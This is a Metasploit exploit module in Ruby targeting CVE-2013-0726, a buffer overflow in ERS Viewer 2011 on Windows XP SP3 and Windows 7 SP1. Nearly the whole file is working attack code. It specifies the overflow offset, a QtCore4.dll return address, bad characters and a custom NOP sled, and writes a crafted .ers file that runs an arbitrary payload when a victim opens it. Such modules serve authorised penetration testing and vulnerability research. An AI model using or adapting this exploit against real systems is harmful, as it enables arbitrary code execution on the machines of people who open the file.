# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ERS Viewer 2011 ERS File Handling Buffer Overflow",
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow vulnerability found in ERS Viewer 2011
        (version 11.04). The vulnerability exists in the module ermapper_u.dll where the
        function ERM_convert_to_correct_webpath handles user provided data in a insecure
        way. It results in arbitrary code execution under the context of the user viewing
        a specially crafted .ers file. This module has been tested successfully with ERS
        Viewer 2011 (version 11.04) on Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Parvez Anwar&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-0726&#039; ],
          [ &#039;OSVDB&#039;, &#039;92694&#039; ],
          [ &#039;BID&#039;, &#039;59379&#039; ],
          [ &#039;URL&#039;, &#039;http://secunia.com/advisories/51725/&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 7516,
          &#039;BadChars&#039; => "\x22\x5c" +
            (0x7f..0xff).to_a.pack("C*") +
            (0x00..0x08).to_a.pack("C*") +
            (0x0a..0x1f).to_a.pack("C*"),
          &#039;DisableNops&#039; => true,
          &#039;EncoderOptions&#039; =>
            {
              &#039;BufferRegister&#039; => &#039;ESP&#039;
            }
        },
      &#039;SaveRegisters&#039;  => [ &#039;ESP&#039; ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "process",
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;ERS Viewer 2011 (v11.04)  / Windows XP SP3 / Windows 7 SP1&#039;,
            {
              &#039;Offset&#039; => 260,
              &#039;Ret&#039; => 0x67097d7a # push esp # ret 0x08 from QtCore4.dll
            }
          ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 23 2013",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.ers&#039;]),
      ], self.class)

  end

  # Rewrote it because make_nops is ignoring SaveRegisters
  # and corrupting ESP.
  def make_nops(count)
    return "\x43" * count # 0x43 => inc ebx
  end

  def exploit

    buf = rand_text(target[&#039;Offset&#039;])
    buf << [target.ret].pack("V")
    buf << make_nops(8) # In order to keep ESP pointing to the start of the shellcode
    buf << payload.encoded

    ers = %Q|
DatasetHeader Begin
  Name    = "#{buf}"
DatasetHeader End
    |

    file_create(ers)
  end
end

